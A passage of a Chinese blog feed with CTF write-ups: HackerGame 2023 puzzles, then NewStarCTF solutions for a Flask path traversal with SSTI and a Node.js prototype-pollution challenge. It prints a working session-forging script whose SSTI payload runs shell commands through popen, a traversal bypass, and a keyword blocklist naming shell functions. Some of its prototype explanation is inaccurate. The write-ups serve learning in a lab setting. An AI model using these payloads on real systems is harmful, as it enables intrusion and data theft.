<h3 id="惜字如金-2-0"><a href="#惜字如金-2-0" class="headerlink" title="惜字如金 2.0"></a>惜字如金 2.0</h3><h4 id="惜字如金化标准"><a href="#惜字如金化标准" class="headerlink" title="惜字如金化标准"></a>惜字如金化标准</h4><p>惜字如金化指的是将一串文本中的部分字符删除，从而形成另一串文本的过程。该标准针对的是文本中所有由 52 个拉丁字母连续排布形成的序列，在下文中统称为「单词」。一个单词中除「AEIOUaeiou」外的 42 个字母被称作「辅音字母」。整个惜字如金化的过程按照以下两条原则对文本中的每个单词进行操作：</p>
<p>第一原则（又称 creat 原则）：如单词最后一个字母为「e」或「E」，且该字母的上一个字母为辅音字母，则该字母予以删除。<br>第二原则（又称 referer 原则）：如单词中存在一串全部由完全相同（忽略大小写）的辅音字母组成的子串，则该子串仅保留第一个字母。<br>容易证明惜字如金化操作是幂等的：惜字如金化多次和惜字如金化一次的结果相同。</p>
<h4 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Th siz of th fil may reduc after XZRJification</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_equals</span>(<span class="params">left, right</span>):</span><br><span class="line">    <span class="comment"># check whether left == right or not</span></span><br><span class="line">    <span class="keyword">if</span> left != right: exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cod_dict</span>():</span><br><span class="line">    <span class="comment"># prepar th cod dict</span></span><br><span class="line">    cod_dict = []</span><br><span class="line">    cod_dict += [<span class="string">&#x27;nymeh1niwemflcir&#125;echaet&#x27;</span>]</span><br><span class="line">    cod_dict += [<span class="string">&#x27;a3g7&#125;kidgojernoetlsup?h&#x27;</span>]</span><br><span class="line">    cod_dict += [<span class="string">&#x27;ulw!f5soadrhwnrsnstnoeq&#x27;</span>]</span><br><span class="line">    cod_dict += [<span class="string">&#x27;ct&#123;l-findiehaai&#123;oveatas&#x27;</span>]</span><br><span class="line">    cod_dict += [<span class="string">&#x27;ty9kxborszstguyd?!blm-p&#x27;</span>]</span><br><span class="line">    check_equals(<span class="built_in">set</span>(<span class="built_in">len</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> cod_dict), &#123;<span class="number">24</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(cod_dict)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_data</span>(<span class="params">input_codes</span>):</span><br><span class="line">    <span class="comment"># retriev th decrypted data</span></span><br><span class="line">    cod_dict = get_cod_dict()</span><br><span class="line">    output_chars = [cod_dict[c] <span class="keyword">for</span> c <span class="keyword">in</span> input_codes]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(output_chars)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __nam__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># check som obvious things</span></span><br><span class="line">    check_equals(<span class="string">&#x27;creat&#x27;</span>, <span class="string">&#x27;cr&#x27;</span> + <span class="string">&#x27;at&#x27;</span>)</span><br><span class="line">    check_equals(<span class="string">&#x27;referer&#x27;</span>, <span class="string">&#x27;refer&#x27;</span> + <span class="string">&#x27;rer&#x27;</span>)</span><br><span class="line">    <span class="comment"># check th flag</span></span><br><span class="line">    flag = decrypt_data([<span class="number">53</span>, <span class="number">41</span>, <span class="number">85</span>, <span class="number">109</span>, <span class="number">75</span>, <span class="number">1</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">77</span>, <span class="number">90</span>,</span><br><span class="line">                         <span class="number">17</span>, <span class="number">118</span>, <span class="number">36</span>, <span class="number">25</span>, <span class="number">13</span>, <span class="number">89</span>, <span class="number">90</span>, <span class="number">3</span>, <span class="number">63</span>, <span class="number">25</span>,</span><br><span class="line">                         <span class="number">31</span>, <span class="number">77</span>, <span class="number">27</span>, <span class="number">60</span>, <span class="number">3</span>, <span class="number">118</span>, <span class="number">24</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">61</span>,</span><br><span class="line">                         <span class="number">25</span>, <span class="number">63</span>, <span class="number">77</span>, <span class="number">36</span>, <span class="number">5</span>, <span class="number">32</span>, <span class="number">60</span>, <span class="number">67</span>, <span class="number">113</span>, <span class="number">28</span>])</span><br><span class="line">    check_equals(flag.index(<span class="string">&#x27;flag&#123;&#x27;</span>), <span class="number">0</span>)</span><br><span class="line">    check_equals(flag.index(<span class="string">&#x27;&#125;&#x27;</span>), <span class="built_in">len</span>(flag) - <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># print th flag</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>我的做法是做推理，他说到了前 5 个字符是 ‘flag{‘ ,最后一个字符是 ‘}’ ，我们找规律发现这边至少有 119 个字符，而这一对串里只有 115 个，说明惜字如金去掉了部分字符，根据这个惜字如金的标准，首先我们现在每一个串的末尾加上 e，跑一遍看看结果：</p>
<p><code>5laulyoufeepr3cvees3df7weparsn3sfr1gwn!&#125;</code></p>
<p>这里可以看到字符’la’和字符’}’已经被凑出来了，然后就是一个个试了，我的方法就是在末尾添 e 删 e（因为存在 referer 标准，要添几个 e 都是不确定的），我最后试出来的是：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cod_dict += [<span class="string">&#x27;nymeh1niwemflcir&#125;echaete&#x27;</span>]</span><br><span class="line">cod_dict += [<span class="string">&#x27;a3g7&#125;kidgojernoetlsup?hee&#x27;</span>]</span><br><span class="line">cod_dict += [<span class="string">&#x27;ulw!f5soadrhwnrsnstnoeqe&#x27;</span>]</span><br><span class="line">cod_dict += [<span class="string">&#x27;ct&#123;l-findiehaai&#123;oveatase&#x27;</span>]</span><br><span class="line">cod_dict += [<span class="string">&#x27;ty9kxborszstguyd?!blm-pe&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>结果为：<br><code>flag&#123;yoe-ve-r3cover3d-7he-an5w3r-r1ght?&#125;</code></p>
<p>但传上去发现是错的，我发现这个’yoe’有问题，改成’you’上传就正确了。</p>
<h3 id="高频率星球"><a href="#高频率星球" class="headerlink" title="高频率星球"></a>高频率星球</h3><p>题目：<br>茫茫星系间，文明被分为不同的等级。每一个文明中都蕴藏了一种古老的力量 —— flag，被认为是其智慧的象征。</p>
<p>你在探索的过程中意外进入了一个封闭空间。这是一个由神秘的高频率星人控制着的星球。星球的中心竖立着一个巨大的三角形任务牌，上面刻着密文和挑战。</p>
<p>高频率星人的视觉输入频率极高，可以一目千行、过目不忘，他们的交流对地球人来说过于超前了。flag 被藏在了这段代码中，但是现在只有高频率星人在终端浏览代码的时候，使用 asciinema 录制的文件了，你能从中还原出代码吗？</p>
<p>大概就是还原 asciinema 录制文件，然后就跑还原出来的代码，<br>这里用命令：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">asciinema cat asciinema_restore.rec &gt; output.txt</span><br></pre></td></tr></table></figure>

<p>跑出来之后发现很多干扰，所以用 sed 过滤一下：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">asciinema cat asciinema_restore.rec | sed &#x27;s/\x1b\[[<span class="number">0</span>-<span class="number">9</span>;]*[a-zA-Z]//g&#x27; | sed &#x27;s/\x1b.//g&#x27; | tr -d &#x27;\b&#x27; &gt; output.txt</span><br></pre></td></tr></table></figure>

<p>跑出来后发现还是有部分没去掉的，就人工去了，大概就是 find 然后替换这样子，还原出代码后跑这个代码就能获得到 flag 了：</p>
<p><img src="/2023/11/04/HackerGame2023/13.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>WP 就写到这里了，之后会好好研究每一道题，之后的题解会单独放出来，这里就把我写出来的题做一个总结。这次 HackerGame 很有意思，期待明年的！</p>
]]></content>
      <categories>
        <category>HackerGame</category>
        <category>2023</category>
      </categories>
      <tags>
        <tag>社工</tag>
        <tag>爆破</tag>
        <tag>docker</tag>
        <tag>git</tag>
        <tag>HTTP</tag>
        <tag>Web 编程</tag>
        <tag>asciinema</tag>
        <tag>json</tag>
        <tag>yaml</tag>
      </tags>
  </entry>
  <entry>
    <title>【NewStarCTF2023】Inject Me 目录穿越+ssti+flask_jwt</title>
    <url>/2023/11/07/NewStarCTF-Inject-Me/</url>
    <content><![CDATA[<h1 id="【NewStarCTF2023】Inject-Me-目录穿越-ssti-flask-jwt"><a href="#【NewStarCTF2023】Inject-Me-目录穿越-ssti-flask-jwt" class="headerlink" title="【NewStarCTF2023】Inject Me 目录穿越+ssti+flask_jwt"></a>【NewStarCTF2023】Inject Me 目录穿越+ssti+flask_jwt</h1><p>进到靶机后, 稍微探索一下,发现有个这个图片泄露了源码:</p>
<p><img src="/2023/11/07/NewStarCTF-Inject-Me/image.png"></p>
<p>这里是一个目录穿越漏洞,其中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">filename = filename.replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>这一行代码是可以双写 <code>../</code> 成　<code>....//</code> 进行绕过的.然后由于这是一个 flask 框架,我们尝试去找它的 app.py 文件, 在寻找之前,先来了解 flask 框架的文件结构</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/your-application</span><br><span class="line">    /venv                <span class="comment"># 虚拟环境目录</span></span><br><span class="line">    /app                 <span class="comment"># 应用模块目录</span></span><br><span class="line">        __init__.py      <span class="comment"># 初始化应用并引入各个组件</span></span><br><span class="line">        /templates       <span class="comment"># Jinja2模板文件夹</span></span><br><span class="line">            layout.html  <span class="comment"># 基本布局模板</span></span><br><span class="line">            index.html   <span class="comment"># 主页模板</span></span><br><span class="line">            login.html   <span class="comment"># 登录页面模板</span></span><br><span class="line">            ...</span><br><span class="line">        /static          <span class="comment"># 静态文件夹（css, js, images等）</span></span><br><span class="line">            /css         <span class="comment"># CSS文件</span></span><br><span class="line">            /js          <span class="comment"># JavaScript文件</span></span><br><span class="line">            /images      <span class="comment"># 图片文件</span></span><br><span class="line">            ...</span><br><span class="line">        views.py         <span class="comment"># 视图函数模块</span></span><br><span class="line">        models.py        <span class="comment"># 数据库模型</span></span><br><span class="line">        forms.py         <span class="comment"># 表单类</span></span><br><span class="line">    app.py               <span class="comment"># 应用启动和配置</span></span><br><span class="line">    config.py            <span class="comment"># 配置文件</span></span><br><span class="line">    requirements.txt     <span class="comment"># 依赖项列表文件</span></span><br></pre></td></tr></table></figure>

<p>如果能实现目录穿越,那么 <code>app.py</code> 和 <code>config.py</code> 这个两个文件可以优先查看.</p>
<p>最后构造 url 请求如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/download?file=....//....//app.py</span><br></pre></td></tr></table></figure>

<p>成功看到题目源码(这里只张贴源码有意义的部分):</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/backdoor&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(session.get(<span class="string">&quot;user&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&quot;user&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">        name = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> re.findall(</span><br><span class="line">                <span class="string">r&#x27;__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.&#x27;</span>,</span><br><span class="line">                name):</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(</span><br><span class="line">                <span class="string">&#x27;竟然给&lt;h1&gt;%s&lt;/h1&gt;你找到了我的后门，你一定是网络安全大赛冠军吧！😝 &lt;br&gt; 那么 现在轮到你了!&lt;br&gt; 最后祝您玩得愉快!😁&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        abort(<span class="number">500</span>)</span><br></pre></td></tr></table></figure>

<p>整个代码的逻辑就是从cookie 的 session 里取出 user, 如果 user 不等于 guest, 就经过一层过滤然后 <code>render_template_string</code> 渲染出来.</p>
<p>这里就是 ssti 绕过了, 同时还要找到 <code>secret key</code> 去构造 session.</p>
<p>再查看 <code>config.py</code> 文件,发现:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secret_key = <span class="string">&quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</span></span><br></pre></td></tr></table></figure>

<p>成功拿到 secret_key, 然后就是写代码去生成对应的 session. flask 的 session 与普通的 jwt 生成不一样, 需要写代码去模拟 session 的签名.</p>
<p>而且这一行代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> re.findall(</span><br><span class="line">                <span class="string">r&#x27;__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.&#x27;</span>,</span><br><span class="line">                name):</span><br></pre></td></tr></table></figure>

<p>过滤一堆关键字, 我的处理思路就是在 session 里面传关键字,然后在 user 里面调用(写的过程比较恶心,要去计算闭合和引号), 最后生成 session 的代码如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># flask session生成代码</span></span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> URLSafeTimedSerializer</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">SECRET_KEY = <span class="string">&quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = SECRET_KEY</span><br><span class="line"><span class="comment"># Flask 用来序列化 session 数据的接口</span></span><br><span class="line">session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line"><span class="comment"># 使用上述 serializer 来生成 session</span></span><br><span class="line">session_data = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;&#123;% print(&#x27;&#x27;[session[&#x27;a&#x27;]][session[&#x27;b&#x27;]][0][session[&#x27;c&#x27;]]()[117][session[&#x27;d&#x27;]][session[&#x27;e&#x27;]][session[&#x27;f&#x27;]](&#x27;more /y0U3_f14g_1s_h3re&#x27;)[session[&#x27;g&#x27;]]())%&#125;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;a&quot;</span>:<span class="string">&#x27;__class__&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;b&quot;</span>:<span class="string">&#x27;__bases__&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;c&quot;</span>:<span class="string">&#x27;__subclasses__&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;d&quot;</span>:<span class="string">&#x27;__init__&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;e&quot;</span>:<span class="string">&#x27;__globals__&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;f&quot;</span>:<span class="string">&#x27;popen&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;g&quot;</span>:<span class="string">&#x27;read&#x27;</span></span><br><span class="line">               &#125;</span><br><span class="line"><span class="comment"># session_data = &#123;&#125;</span></span><br><span class="line">encoded_session = session_serializer.dumps(session_data)</span><br><span class="line"><span class="built_in">print</span>(encoded_session)</span><br></pre></td></tr></table></figure>

<p>最后发送拿到 flag:</p>
<p><img src="/2023/11/07/NewStarCTF-Inject-Me/result.jpg"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>ssti</tag>
        <tag>flask</tag>
        <tag>jwt</tag>
      </tags>
  </entry>
  <entry>
    <title>【NewStarCTF2023】OtenkiGirl nodejs 原型链污染</title>
    <url>/2023/11/06/NewStarCTF-Otenki-Girl/</url>
    <content><![CDATA[<h1 id="【NewStarCTF2023】OtenkiGirl-nodejs-原型链污染"><a href="#【NewStarCTF2023】OtenkiGirl-nodejs-原型链污染" class="headerlink" title="【NewStarCTF2023】OtenkiGirl nodejs 原型链污染"></a>【NewStarCTF2023】OtenkiGirl nodejs 原型链污染</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>进去之后,是一个类似于 blog 的页面,你输入对应信息后加入购物车就会把东西张贴出来:</p>
<p><img src="/2023/11/06/NewStarCTF-Otenki-Girl/image.png"></p>
<p>后台抓包发现是post json. 题目给了源码,打开源码文件后有 hint 文件,提示我们去 routes 文件夹里找,然后在 submit.js 文件里看到了 <code>merge</code> 函数.</p>
<p><code>merge</code>函数是一个经典的 nodejs 污染函数,接下来浅析一下什么是 nodejs 原型链污染。</p>
<h2 id="nodejs-原型链污染"><a href="#nodejs-原型链污染" class="headerlink" title="nodejs 原型链污染"></a>nodejs 原型链污染</h2><p> JavaScript 中，几乎所有对象都是 Object 的实例，对象原型包含了可以被继承的属性和方法。攻击者通过污染对象原型添加或修改属性，能够影响所有继承自该原型的对象。</p>
<p> 在一个对象生成后,会生成一个关于该对象的原型,如:</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> cat = &#123;&#125;;</span><br></pre></td></tr></table></figure>

<p>上述代码构造了一个对象 cat, 首先会生成该 cat 的原型,即 <code>cat.prototype</code>.  生成 <code>prototype</code> 后,会生成一个隐式的构造函数 <code>cat()</code>, 这里构造函数 <code>cat()</code> 的原型 (protoype)就是 <code>cat.prototype</code>, 而对于构造函数构造出来的对象,也会有一个属性指向他的原型,即 <code>cat[&#39;__proto__&#39;]</code>.</p>
<p>同时由于 <code>cat</code> 对象是继承于 <code>Object</code> 对象,所以 <code>cat</code> 对象的原型 <code>cat.prototype</code> 也有原型,他的原型就是 <code>Object</code> 的原型 <code>Object.prototype</code>.</p>
<p>即 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat.prototype[&#x27;__proto__&#x27;] =  Object.prototype</span><br></pre></td></tr></table></figure>

<p>由于 <code>Object</code> 没有父类,所以 <code>Object</code> 的原型就是 null.</p>
<p>所以在 <code>cat</code> 这个对象就有一条原型链:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat(实例对象) -&gt; cat.prototype(实例原型) -&gt; Object[&#x27;__proto__&#x27;] -&gt; null</span><br></pre></td></tr></table></figure>

<p>给一张网图方便理解:</p>
<p><img src="/2023/11/06/NewStarCTF-Otenki-Girl/image-1.png"></p>
<p>对于下面代码,我们调用了一个 cat 中不存在的属性:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cat.<span class="property">toString</span>);</span><br></pre></td></tr></table></figure>

<p>由于 cat 中没有 toString 属性, 他会沿着原型链向上搜索(先搜索 cat 自己的 prototype,再搜索 Object 的,最后到 null 返回)。也就是说在这里他会去<strong>尝试调用 Object.prototype 的 toString 属性</strong></p>
<p>如果攻击者能够篡改 Object.prototype.toString, 那么上面这句代码就会打印攻击者所指定的内容。</p>
<p>这里由于 Object 是几乎所有属性的类, 所以只要代码中存在</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">obj1[a] = obj2[a]</span><br></pre></td></tr></table></figure>

<p>其中<strong>如果 obj1 和 a 我们可以指定且obj1[a]的值我们可以指定</strong>,那么就可以触发原型链污染.</p>
<p>接下来分析为什么<code>merge</code>函数会触发原型链污染:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">dst, src</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> dst !== <span class="string">&quot;object&quot;</span> || <span class="keyword">typeof</span> src !== <span class="string">&quot;object&quot;</span>) <span class="keyword">return</span> dst;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> src) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> dst &amp;&amp; key <span class="keyword">in</span> src) &#123;</span><br><span class="line">            dst[key] = <span class="title function_">merge</span>(dst[key], src[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dst[key] = src[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里传入的 dst 和 src 都是 Object 类,这里首先会遍历 src 里的所有键 <code>key</code>, 然后将判断 <code>key</code> 是否在源实体和目标实体都存在,如果存在就递归 merge(这里递归是为了保证结构一致),不存在就直接赋值.</p>
<p>在这里如果 src 中存在我们人为构建的键名 <code>__proto__</code>, 如构造了</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> &#x27;__proto__&#x27;<span class="punctuation">:</span><span class="punctuation">&#123;</span>&#x27;a&#x27;<span class="punctuation">:</span>&#x27;<span class="number">1</span>&#x27;<span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>


<p>那么在</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (key <span class="keyword">in</span> dst &amp;&amp; key <span class="keyword">in</span> src)</span><br></pre></td></tr></table></figure>

<p>这行代码就会通过,因为对于 <code>dst</code> , <code>__proto__</code> 是一定存在的, 之后就会进入下一轮递归, 在下一轮递归中, 此时的 <code>dst</code> 就是的原来的 <code>dst[&#39;__proto__&#39;]</code>, 然后就会 for 循环遍历<code>src[&#39;__proto__&#39;]</code>的键名,此时的 <code>key</code> &#x3D; a, 进入到判断语句,此时判断语句不会通过, 因为<code>dst[&#39;__proto__&#39;]</code>中不存在属性 a, 然后就会进入到赋值语句:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">dst[key] = src[key];</span><br></pre></td></tr></table></figure>

<p>此时上面这行代码就等效于</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">dst[&#x27;__proto__&#x27;][&#x27;a&#x27;] = src[&#x27;__proto__&#x27;][&#x27;a&#x27;] = 1</span><br></pre></td></tr></table></figure>

<p>就完成了污染,对于每一个 <code>Object</code> 类 ,我们在新建的之后调用 a 属性,都会沿着原型链找到 <code>Object[&#39;__proto__&#39;]</code>里的 a 属性,其中 a 属性被赋值成了 1.</p>
<p>这里有一点要注意,要确保 merge 操作前, src 经过 <strong>json 解析</strong>, 如果不经过解析,那么<code>__proto__</code>会被认定是原型,for 遍历时就会从他开始遍历,即这是的 <code>key</code> 就变成 a了。json 解析后 <code>__proto__</code> 才会被严格解析成一个键名, 而非是原型,即经过下列操作:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> dst = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(&#123; <span class="string">&#x27;__proto__&#x27;</span>:&#123;<span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125; &#125;);</span><br></pre></td></tr></table></figure>

<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>题目代码的提交逻辑为:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/submit&quot;</span>, <span class="keyword">async</span> (ctx) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (ctx.<span class="property">header</span>[<span class="string">&quot;content-type&quot;</span>] !== <span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;Content-Type must be application/json&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> jsonText = ctx.<span class="property">request</span>.<span class="property">rawBody</span> || <span class="string">&quot;&#123;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(jsonText);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> data[<span class="string">&quot;contact&quot;</span>] !== <span class="string">&quot;string&quot;</span> || <span class="keyword">typeof</span> data[<span class="string">&quot;reason&quot;</span>] !== <span class="string">&quot;string&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">                <span class="attr">msg</span>: <span class="string">&quot;Invalid parameter&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (data[<span class="string">&quot;contact&quot;</span>].<span class="property">length</span> &lt;= <span class="number">0</span> || data[<span class="string">&quot;reason&quot;</span>].<span class="property">length</span> &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">                <span class="attr">msg</span>: <span class="string">&quot;Parameters contact and reason cannot be empty&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">DEFAULT</span> = &#123;</span><br><span class="line">            <span class="attr">date</span>: <span class="string">&quot;unknown&quot;</span>,</span><br><span class="line">            <span class="attr">place</span>: <span class="string">&quot;unknown&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title function_">insert2db</span>(<span class="title function_">merge</span>(<span class="variable constant_">DEFAULT</span>, data));</span><br><span class="line">        ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: result</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(e);</span><br><span class="line">        ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;Internal Server Error&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>可以看到这里将我们传入的数据做了 json 解析然后放到 merge 函数里, 这里就能够触发原型污染了. 主要是怎么通过原型污染去获取到 flag 呢, 我们看其他文件, 发现<code>info.js</code>中存在代码:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getInfo</span>(<span class="params">timestamp</span>) &#123;</span><br><span class="line">    timestamp = <span class="keyword">typeof</span> timestamp === <span class="string">&quot;number&quot;</span> ? timestamp : <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="comment">// Remove test data from before the movie was released</span></span><br><span class="line">    <span class="keyword">let</span> minTimestamp = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="variable constant_">CONFIG</span>.<span class="property">min_public_time</span> || <span class="variable constant_">DEFAULT_CONFIG</span>.<span class="property">min_public_time</span>).<span class="title function_">getTime</span>();</span><br><span class="line">    timestamp = <span class="title class_">Math</span>.<span class="title function_">max</span>(timestamp, minTimestamp);</span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> sql.<span class="title function_">all</span>(<span class="string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123; <span class="keyword">throw</span> e &#125;);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的逻辑就是你传入一个时间戳,然后和他设置的最小时间戳做对比,把大的那个时间戳作为 SQL 的查询匹配条件. 这里的思路就很明显了,我们要把它所有的时间戳的记录全部调出来,就能拿到 flag.</p>
<p>注意这一行代码:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> minTimestamp = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="variable constant_">CONFIG</span>.<span class="property">min_public_time</span> || <span class="variable constant_">DEFAULT_CONFIG</span>.<span class="property">min_public_time</span>).<span class="title function_">getTime</span>();</span><br></pre></td></tr></table></figure>

<p>这一行代码会判断 <code>minTimestamp</code> 是否为空如果是空就换成他设置的默认值, 这里就能触发 prototype 调用了, 如果我们在先前的参数中传入 <code>minTimestamp</code> ,给他赋一个极小的值. 之后在判断是否为空的时候,就会沿着原型链往上寻找,找到我们设置的值并赋上,然后后面的 SQL 语句就能全部调出来了.</p>
<p>最后构造 payload 为:</p>
<p><img src="/2023/11/06/NewStarCTF-Otenki-Girl/payload.jpg"></p>
